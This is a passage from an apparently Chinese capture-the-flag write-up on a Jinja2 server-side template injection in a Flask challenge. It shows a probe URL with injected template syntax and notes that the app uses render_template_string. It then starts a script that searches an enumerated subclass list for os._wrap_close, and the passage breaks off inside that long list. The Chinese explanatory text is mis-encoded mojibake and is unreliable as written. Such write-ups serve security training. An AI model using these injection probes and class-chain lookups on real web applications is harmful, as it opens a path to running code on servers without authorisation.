class="hljs txt">secr3tofpop?name=&#123;%%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162819362.png" alt="image-20231010162819362"></p><p>å¯ä»¥äº†è§£åˆ°è¯¥sstiæ¨¡æ¿æ³¨å…¥æ˜¯åœ¨python3è¯­è¨€ä¸‹çš„jinja2æ¨¡æ¿æ³¨å…¥</p><p><img src="/images/2023-11-3-newstar-3/image-20231010163040317.png" alt="image-20231010163040317"></p><p>å¯ä»¥äº†è§£åˆ°è¯¥æ¨¡æ¿æ¸²æŸ“æ˜¯ä½¿ç”¨render_template_string()å‡½æ•°</p><p>å…ˆå¯»æ‰¾ç±»os._wrap_closeï¼š<br>å¯»æ‰¾è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;urllib3.util.timeout.Timeout&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;urllib3.util.retry.Retry&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;urllib3.util.ssltransport.SSLTransport&#x27;&gt;, &lt;class &#x27;_queue.SimpleQueue&#x27;&gt;, &lt;class &#x27;queue.Queue&#x27;&gt;, &lt;class &#x27;queue._PySimpleQueue&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;urllib3.fields.RequestField&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib3.connection.DummyConnection&#x27;&gt;, &lt;class &#x27;urllib3.response.ContentDecoder&#x27;&gt;, &lt;class &#x27;urllib3.response.GzipDecoderState&#x27;&gt;, &lt;class &#x27;urllib3.response.BytesQueueBuffer&#x27;&gt;, &lt;class &#x27;urllib3._request_methods.RequestMethods&#x27;&gt;, &lt;class &#x27;urllib3.connectionpool.ConnectionPool&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;charset_normalizer.md.MessDetectorPlugin&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatch&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CharsetMatches&#x27;&gt;, &lt;class &#x27;charset_normalizer.models.CliDetectionResult&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;requests.cookies.MockRequest&#x27;&gt;, &lt;class &#x27;requests.cookies.MockResponse&#x27;&gt;, &lt;class &#x27;requests.auth.AuthBase&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;requests.models.RequestEncodingMixin&#x27;&gt;, &lt;class &#x27;requests.models.RequestHooksMixin&#x27;&gt;, &lt;class &#x27;requests.models.Response&#x27;&gt;, &lt;class &#x27;requests.adapters.BaseAdapter&#x27;&gt;, &lt;class &#x27;requests.sessions.SessionRedirectMixin&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.structures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;flask.globals._FakeStack&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;configparser.Interpolation&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.trsock.TransportSocket&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class 